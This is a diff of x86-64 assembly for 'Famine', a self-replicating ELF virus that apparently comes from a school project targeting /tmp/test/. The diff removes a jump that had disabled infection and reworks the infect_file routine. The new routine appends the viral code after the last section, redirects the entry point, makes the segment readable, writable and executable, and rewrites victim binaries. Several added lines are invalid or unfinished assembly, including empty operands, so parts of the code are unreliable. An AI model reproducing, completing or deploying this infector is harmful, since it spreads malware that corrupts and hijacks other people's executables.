@@ -21,7 +21,6 @@ famine64_func:
 	push 	rbx
 	sub 	rsp, 8
 
-	jmp 	famine64_end
 	lea 	rdi, [rel dir_one]
 	call 	find_files
 	lea 	rdi, [rel dir_two]
@@ -107,6 +106,7 @@ find_files_end:
 get_dat_elf:
 	push	rbp
 	push	rbx
+	push	rcx
 	push 	r8
 	push 	r9
 	push 	r10
@@ -202,7 +202,7 @@ close_file:
 	mov 	rdx, QWORD [rsp + 12]	; void *data
 	mov 	rsi, QWORD [rsp + 4]	; int size
 	lea 	rdi, [rsp + 20] 		; char *path
-	call	pack_file
+	call	infect_file
 
 munmap_file:	
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -218,16 +218,17 @@ get_dat_elf_end:
 	pop 	r10
 	pop 	r9
 	pop 	r8
+	pop 	rcx
 	pop 	rbx
 	pop 	rbp
 	ret
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;                                                                            ;;
-;;              void pack_file(char *path, int size, char *data)              ;;
+;;              void infect_file(char *path, int size, char *data)            ;;
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-pack_file:
+infect_file:
 	cmp 	BYTE [rdx], 0x7f 		; compare \x7fELF
 	jne 	pack_file_end
 	cmp 	BYTE [rdx + 1], 'E'
@@ -248,122 +249,166 @@ pack_file:
 	ja  	pack_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 1. Verify if the file is already infected
-	;;    RDX contains *data
-	;;    RSI contains size
-	;;    RDI contains *path
+	;; 1. Find the highest memory mapped PT_LOAD segment
+	;;    R9 will store it.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;;    R8  : Program Header table start
+	;;    RCX : Program Header table end
+
+	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
+	lea 	r8, [rdx + r8]			; Program Header table start
+	xor 	rcx, rcx
+	movzx	ecx, WORD [rdx + 56] 	; hdr->e_phnum
+	xor 	r9, r9
+	movzx	r9d, WORD [rdx + 54]	; hdr->e_phentsize
+	imul	rcx, r9
+	add 	rcx, r8 	   			; Program Header table end
+
+highest_pt_load:
+	mov 	r9, r8
+next_segment:
+	add 	r8w, WORD [rdx + 54]				; move to next Program Header segment
+	cmp 	rcx, r8 	 						; end of Program Header segment ?
+	jge  	find_section
+get_segment:
+	cmp 	DWORD [r8], 1 						; is it PT_LOAD segment ?
+	jne 	next_segment
+	cmp 	QWORD [r9 + 16], QWORD [r8 + 16] 	; compare the pt_load segments virtual address
+	jl  	highest_pt_load
+	jmp 	next_segment
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; First, find the segment containing the entry point
-	;;     RAX : Entry Point
-	;;     R9  : Program Header Table start
-	;;     RCX : Program Header Table end
+	;; 2. Find the last section of the segment found
+	;;    R10 will store it.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	rax, QWORD [rdx + 24] 		; hdr->e_entry
-	mov 	r9, QWORD [rdx + 32]		; hdr->e_phoff
-	lea 	r9, [rdx + r9]				; PHT start
+	;;    R8  : Section Header table start
+	;;    RCX : Section Header table end
+find_section:
+	mov 	r8, QWORD [rdx + 40] 	; ->e_shoff (size: 8)
+	lea 	r8, [rdx + r8]			; Section Header table start
 	xor 	rcx, rcx
-	movzx	rcx, WORD [rdx + 56]		; hdr->e_phnum
-	xor 	r8, r8
-	movzx	r8, WORD [rdx + 54]			; hdr->e_phentsize
-	imul	rcx, r8
-	add 	rcx, r9						; PHT end
-	jmp 	find_entrypoint_section
+	movzx	ecx, WORD [rdx + 60] 	; hdr->e_shnum
+	xor 	r10, r10
+	movzx	r10d, WORD [rdx + 58]	; hdr->e_shentsize
+	imul	rcx, r10
+	add 	rcx, r8 	   			; Section Header table end
+found_last_section:
+	mov 	r10, r8
 next_section:
-	add 	r9w, WORD [rdx + 54]		; add e_phentsize
-	cmp 	r9, rcx
-	jge  	pack_file_end
-find_entrypoint_section:
-	mov 	r10, QWORD [r9 + 16] 		; segment->p_vaddr
-	cmp 	r10, rax					; segment->p_vaddr > entry ? go next
-	jg  	next_section
-	add 	r10, QWORD [r9 + 32] 		; segment->p_vaddr + segment->p_filesz
-	cmp 	rax, r10					; entry > p_vaddr + p_filesz ? go next
-	jg  	next_section
+	add 	r8w, WORD [rdx + 58] 				; next Section Header
+	cmp 	rcx, r8
+	jge 	check_signature
+get_section:
+	cmp 	QWORD [r8 + 16], QWORD [r10 + 16] 	; compare sections addresse
+	jg  	found_last_section
+	jmp 	next_section
+
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; Second, compare with our signature
-	;;    R9  : Entry Point section
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-	mov 	r8, QWORD [r9 + 8]				; segment->p_offset
-	add 	r8, QWORD [r9 + 32]				; segment->p_filesz
-	mov 	rax, QWORD [rdx + r8 - 16]		; signature offset
-	cmp 	rax, QWORD [rel signature]
+	;; 3. Verify if the file is already infected
+	;; 
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;;    RDX contains *data
+	;;    R10 contains the last Section header
+check_signature:	
+	lea 	r8, rdx
+	add 	r8, QWORD [r10 + 24] 		; add isection->sh_offset
+	add 	r8, QWORD [r10 + 32]		; add isection->sh_size
+	sub 	r8, 16						; less the signature offset from the end
+	mov 	r8, [r8]
+	cmp 	r8, QWORD [rel signature]
 	je  	pack_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 2. Find the memory mapped PT_LOAD segment that can contain our code
-	;;    Register R9 will store it.
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;;    R9  : Program Header table start
-	;;    RCX : Program Header table end
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	r9, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
-	lea 	r9, [rdx + r9]			; Program Header table start
-	xor 	rcx, rcx
-	movzx	ecx, WORD [rdx + 56] 	; hdr->e_phnum
-	xor 	r8, r8
-	movzx	r8d, WORD [rdx + 54]	; hdr->e_phentsize
-	imul	rcx, r8
-	add 	rcx, r9 	   			; Program Header table end
-	jmp 	find_free_space
-next_program:
-	add 	r9w, WORD [rdx + 54]			; move to next Program Header segment
-	cmp 	rcx, r9 	 					; end of Program Header segment ?
-	jle  	pack_file_end					; if it is, no free space has been found, so,
-											; infect next file. NOT optimal !
-find_free_space:
-	cmp 	DWORD [r9], 1 					; is it PT_LOAD ?
-	jne 	next_program
-	mov 	r8, QWORD [r9 + 16]				; segment->p_vaddr
-	add 	r8, QWORD [r9 + 40]				; segment->p_memsz
-	add 	r8d, DWORD [rel famine64_size]
-	mov 	r10, QWORD [r9 + 16] 			; segment->p_vaddr
-	add 	r10, QWORD [r9 + 48]			; segment->p_align
-	cmp 	r8, r10							; vaddr + memsz + famine64_size < vaddr + align ?
-	jg  	next_program
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 3. Erase file from system tree before any changes !!!
+	;; 4. Erase file from system tree before any changes !!!
 	;;    int unlink(char *pathname)
-	;;    RDI already contains *pathname.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;;    RDI already contains *pathname.
 	mov 	rax, SYS_UNLINK
 	syscall
 	cmp 	rax, 0
 	jl  	pack_file_end
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; 5. Modify Sections offset higher than the last Section
+	;; 
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;;    R10 contains last Section header
+	mov 	r8, QWORD [rdx + 40] 	; ->e_shoff (size: 8)
+	lea 	r8, [rdx + r8]			; Section Header table start
+	xor 	rcx, rcx
+	movzx	ecx, WORD [rdx + 60] 	; hdr->e_shnum
+	xor 	r11, r11
+	movzx	r11d, WORD [rdx + 58]	; hdr->e_shentsize
+	imul	rcx, r11
+	add 	rcx, r8 	   			; Section Header table end
+modify_section:	
+	add 	r8w, WORD [rdx + 58] 	; next Section Header
+	cmp 	rcx, r8
+	jge 	modify_elf_header	 	; last section ?
+	mov 	rax, QWORD [r8 + 24] 	; store section->sh_offset
+	cmp 	QWORD [r10 + 24], rax	; last->offset > section->offset ?
+	jg  	next_section_2
+	cmp 	r8, r10					; section == lastsection ?
+	je  	modify_section
+	add 	rax, QWORD [r10 + 32] 	; add to section offset last section size
+	add 	eax, DWORD [rel famine64_size] ; add our code size
+	mov 	QWORD [r8 + 24], rax
+	jmp 	modify_section
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; 6. Modify the Elf Header
+	;; 
+	;;  a. Store old Entry Point ( R11 )
+	;;  b. Modify the Entry Point
+	;;  c. Modify Section Header Table offset
+	;;  d. Increment Section Header number
+	;;  e. Increment Section Header String Index
+	;; 
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;;    RDX contains *data
+	;;    R9  contains last PT_LOAD Segment header
+	;;    R10 contains last Section header
+	;;    R11 will contain original Entry Point
+modify_elf_header:
+	mov 	r11, QWORD [rdx + 24]			; a. original Entry Point
+	;; Compute new entry point
+	mov 	rax, QWORD [r9 + 16]			;      r9->p_vaddr
+	sub 	rax, QWORD [r9 + 8]				;    - r9->p_offset
+	add 	rax, QWORD [r10 + 24]			;    + r10->sh_offset
+	add 	rax, QWORD [r10 + 32]			;    + r10->sh_size
+	mov 	QWORD [rdx + 24], rax			; b. new Entry Point
+	;; Compute for later the jump offset
+	sub 	r11, rax
+	;; Compute the new Section Header table offset
+	mov 	rax, QWORD [r10 + 32]			;      r10->sh_size
+	add 	eax, DWORD [rel famine64_size]	;    + our code size
+	add 	QWORD [rdx + 40], rax			; c. + rdx->e_shoff
+	add 	WORD [rdx + 58], 1				; d. rdx->e_shnum++ 
+	add 	WORD [rdx + 60], 1				; e. rdx->e_shstrndx++
 	
-	mov 	rax, QWORD [rdx + 24]  	; store the original program entry point
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 5. Modify Program Entry Point
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	r8, QWORD [r9 + 16] 	; store infected segment virtual address (+16: ->p_vaddr)
-	add 	r8, QWORD [r9 + 40] 	; add it the segment memory size
- 	 	 	 	 					; (value is virtual address of our infected code)
-	mov 	QWORD [rdx + 24], r8 	; modify the Program entry point
-
-	sub 	rax, r8					; compute the jump offset
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 6. Modify Infected Segment permissions
+	;; 7. Modify Infected Segment
+	;;
+	;;  a. permissions
+	;;  b. memory size
+	;;  c. file size
+	;;  d. alignment (if needed)
+	;; 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+	;;    R9  contains last PT_LOAD Segment header
 	xor 	ecx, ecx
 	or  	ecx, 1					; segment R permission
 	or  	ecx, 2					; segment W permission
 	or  	ecx, 4					; segment X permission
 	mov 	DWORD [r9 + 4], ecx
+	mov 	ecx, DWORD [rel famine64_size]
+	add 	QWORD [r9 + 40], rcx 	; segment memory size
+	mov 	rcx, QWORD [r9 + 40]
+	mov 	QWORD [r9 + 48], rcx 	; segment file size
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 7. Modify Infected Segment memory / file size
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	r10d, DWORD [rel famine64_size]
-	add 	QWORD [r9 + 40], r10  	; change isegment memory size
-	add 	QWORD [r9 + 32], r10  	; change isegment file size
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 8. Rewrite the file
+	;; 9. Rewrite the file
+	;; 
 	;;    a. Re-create the file
 	;;    b. Copy the original program until the infected segment offset.
 	;;    c. Copy our program at the end of it,
@@ -371,24 +416,32 @@ find_free_space:
 	;;    d. Copy, in our program, the original virtual address size,
 	;;       so we will jump to it later.
 	;;    e. Copy the rest of the original program.
+	;; 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	sub 	rsp, 36		; int fd, char *data, size_t size, size_t addr, size_t offset
- 	 	 	 	 		; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20]  , [rsp + 28] 
+	;;    RDI contains *file_path
+	;;    RSI contains data size
+	;;    RDX contains &data
+	;;    R9  contains last PT_LOAD Segment header
+	;;    R10 contains last Section header
+	;;    R11 contains the jump offset value
+	mov 	rax, 36
+	add 	rax, QWORD [rdx + 58] 		; rdx->e_shentsize for the new section
+	sub 	rsp, rax
+	;; int fd, char *data, size_t size, size_t entry_point, size_t offset, Elf64_Shdr section
+	;; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20]       , [rsp + 28] , [rsp + 36]
 
-	mov 	DWORD [rsp], 0 	 			; clean [rsp] to store fd later
-	mov 	QWORD [rsp + 4], rdx 		; store the address of the old file data
-	mov 	QWORD [rsp + 12], rsi  		; store the old file size
-	mov 	QWORD [rsp + 20], rax 		; store the original program entry point
-	mov 	rax, QWORD [r9 + 8] 		
-	add 	rax, QWORD [r9 + 32]
-	sub 	eax, [rel famine64_size]
-	mov 	QWORD [rsp + 28], rax		; store isegment->p_offset + infected->p_memsz - famine64_size
+	mov 	DWORD [rsp], 0 	 			; clean [rsp] to store fd
+	mov 	QWORD [rsp + 4], rdx 		; store the address of the file data
+	mov 	QWORD [rsp + 12], rsi  		; store the file size
+	mov 	QWORD [rsp + 20], r11 		; store the new jump offset
+	mov 	rax, QWORD [r10 + 24] 		;       r10->sh_offset
+	mov 	QWORD [rsp + 28], rax		; store
 	
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; a. int	sys_open(file_path, O_WRONLY | O_CREAT, 0755)
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edx, 493			; 0755
-	mov 	esi, 65				; O_WRONLY|O_CREAT
+	mov 	esi, 65				; O_WRONLY | O_CREAT
 	lea 	rdi, [rdi]			; file path address
 	mov 	rax, SYS_OPEN
 	syscall
@@ -408,31 +461,58 @@ find_free_space:
 	cmp 	rax, 0
 	jl  	clean_write_end
 
+
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; c. int	sys_write(fd, data, IS offset)
-	;;    - Write our injection -
+	;;    - Write '\0' of last section size -
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov 	rcx, QWORD [r10 + 32] 		; r10->sh_size
+write_byte_zero:
+	mov 	edi, DWORD [rsp] 	 		; file fd
+	lea 	rsi, QWORD [rel zero]		; "\0"
+	mov 	rdx, 1
+	mov 	rax, SYS_WRITE
+	syscall
+	cmp 	rcx, 0
+	jg  	write_byte_zero
+	
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; d. int	sys_write(fd, data, IS offset)
+	;;    - Write our code -
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, DWORD [rsp] 	 		; file fd
 	lea 	rsi, [rel famine64_func] 	; famine64_func
 	mov 	edx, [rel famine64_size]	; famine64_size
-	sub 	rdx, 8 	 	 				; less the size of jump_offset
+	sub 	rdx, 8 	 	 				; less the size of jump offset variable
 	mov 	rax, SYS_WRITE
 	syscall
 	cmp 	rax, 0
 	jl  	clean_write_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; d. int	sys_write(fd, data, IS offset)
-	;;    - Write our entry point -
+	;; e. int	sys_write(fd, data, IS offset)
+	;;    - Write jump offset-
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, DWORD [rsp] 		; file fd
-	lea 	rsi, [rsp + 20] 	 	; load the original program entry point address
-	mov 	rdx, 8 	 	 			; sizeof jump_offset
+	lea 	rsi, [rsp + 20] 	 	; load the jump offset value
+	mov 	rdx, 8 	 	 			; sizeof jump offset 
 	mov 	rax, SYS_WRITE
 	syscall
 	cmp 	rax, 0
 	jl  	clean_write_end
-	
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; f. int	sys_write(fd, data, IS offset)
+	;;    - Write new section -
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov 	DWORD [rsp + 36], 0		 	; sh_name
+	mov 	DWORD [rsp + 40], 1		 	; sh_type = SHT_PROGBITS
+	mov 	QWORD [rsp + 44], 0x6		; sh_flags
+	mov 	rax, [rsp + 4]				; load &data
+	add 	rax, 24						; ->e_entry
+	mov 	QWORD [rsp + 52], [rax]		; sh_addr = r9->p_vaddr - r9->p_offset + r10->sh_offset + r10->sh_size;
+	mov 	QWORD [rsp + 60], 			; sh_offset = 
+	mov 	QWORD [rsp + 68], 			; sh_size = 
 	mov 	rax, QWORD [rsp + 28] 			; store size of what we wrote
 	add 	eax, [rel famine64_size]		; add it our code size
 	mov 	QWORD [rsp + 28], rax			; store it again
@@ -449,7 +529,7 @@ find_free_space:
 	syscall
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 7. Close file
+	;; 10. Close file
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 clean_write_end:
 	mov 	edi, DWORD [rsp]
@@ -479,16 +559,9 @@ no_jump:
 	ret
 	nop
 	nop
-	nop
-	nop	
-	nop	
-	nop	
-	nop	
-	nop	
-	nop	
-	nop	
 	
 data:
+	zero dq 0x0
 	famine64_size dd end_of_file - famine64_func
 	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
